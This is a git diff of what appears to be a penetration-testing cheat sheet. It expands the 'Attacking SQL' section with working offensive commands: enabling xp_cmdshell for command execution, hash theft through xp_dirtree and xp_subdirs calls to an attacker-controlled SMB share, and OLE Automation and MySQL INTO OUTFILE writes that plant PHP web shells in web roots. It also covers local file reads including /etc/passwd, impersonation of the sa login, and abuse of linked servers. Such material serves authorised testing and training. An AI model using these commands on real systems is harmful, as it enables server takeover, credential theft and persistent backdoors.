@@ -793,20 +793,105 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 ```
 ##### Attacking SQL
 ```
-# SQLEXPRESS
-EXECUTE sp_configure 'show advanced options', 1
-EXECUTE sp_configure 'xp_cmdshell', 1
-RECONFIGURE
-xp_cmdshell 'whoami'
+# Enable xp_cmdshell (need priv) and execute command in MSSQL
+1> EXECUTE sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> EXECUTE sp_configure 'xp_cmdshell', 1
+6> GO
+7> RECONFIGURE
+8> GO
 
-# Hash stealing using the xp_dirtree command in MSSQL.
-EXEC master..xp_dirtree '\\10.10.110.17\share\'
+1> xp_cmdshell 'whoami'
 
-# Hash stealing using the xp_subdirs command in MSSQL.
-EXEC master..xp_subdirs '\\10.10.110.17\share\'
+# Hash stealing using the xp_dirtree command in MSSQL with Responder.
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+2> GO
 
-# Identify the user and its privileges used for the remote connection in MSSQL.
-EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+# Hash stealing using the xp_subdirs command in MSSQL with Responder.
+1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+2> GO
+
+# MSSQL - Enable Ole Automation Procedures ( priv need to write) and Check current user and permissions and  Write Local File and  Read Local File
+
+(Enable Ole Automation Procedures)
+
+1> sp_configure 'show advanced options', 1
+2> GO
+3> RECONFIGURE
+4> GO
+5> sp_configure 'Ole Automation Procedures', 1
+6> GO
+7> RECONFIGURE
+8> GO
+
+(Check current user and permissions)
+1> SELECT SUSER_SNAME();
+2> GO
+
+(Write Local File)
+
+1> DECLARE @OLE INT
+2> DECLARE @FileID INT
+3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+6> EXECUTE sp_OADestroy @FileID
+7> EXECUTE sp_OADestroy @OLE
+8> GO
+
+(Read Local File)
+
+1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+2> GO
+
+# Impersonate Existing Users with MSSQL
+
+(Identify Users that We Can Impersonate)
+
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> GO
+
+(Verifying our Current User and Role)
+
+1> SELECT SYSTEM_USER
+2> SELECT IS_SRVROLEMEMBER('sysadmin')
+3> go
+
+(Impersonating the SA User)
+
+1> USE master
+2> EXECUTE AS LOGIN = 'sa'
+3> SELECT SYSTEM_USER
+4> SELECT IS_SRVROLEMEMBER('sysadmin')
+5> GO
+
+# Communicate with Other Databases with MSSQL
+
+(Identify linked Servers in MSSQL)
+
+1> SELECT srvname, isremote FROM sysservers
+2> GO
+
+(Identify the user and its privileges used for the remote connection in MSSQL)
+
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+2> GO
+
+
+
+# MySQL - Write Local File
+show variables like "secure_file_priv";
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+# MySQL - Read Local File
+select LOAD_FILE("/etc/passwd");
+
 ```
 ##### Attacking Email Services
 ```
